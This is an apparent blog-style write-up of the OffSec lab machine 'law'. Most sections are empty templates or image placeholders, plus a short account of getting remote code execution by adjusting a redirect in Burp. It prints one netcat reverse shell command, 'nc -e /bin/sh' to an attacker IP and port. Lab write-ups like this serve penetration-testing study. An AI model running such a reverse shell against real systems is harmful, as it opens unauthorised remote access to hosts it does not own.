---
title: "law"
date: 2026-03-19
draft: false
description: "OffSec law writeup"
tags: ["linux", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# law

## Overview

- **OS:** Linux
- **IP:** 192.168.102.190
- **Difficulty:** Intermediate
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

RCE with modification + privesc with cron.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```

```

## Dirbusting

```

```

## Port 80

Web behavior was the main signal here, so I traced each response change before exploitation.

{{< figure src="image 714.png" >}}

## Exploitation

{{< figure src="image 715.png" >}}

ok so none of the exploits were working for some reason so i decided to pull out burp and give it a go manually

changing the redirec to / seemed to have fixed it for me since that php page didnt really exist

{{< figure src="image 716.png" >}}

nc -e /bin/sh 192.168.45.159 9001

and boom we have our reverse shell

{{< figure src="image 717.png" >}}

{{< figure src="image 718.png" >}}

{{< figure src="image 719.png" >}}

{{< figure src="image 720.png" >}}
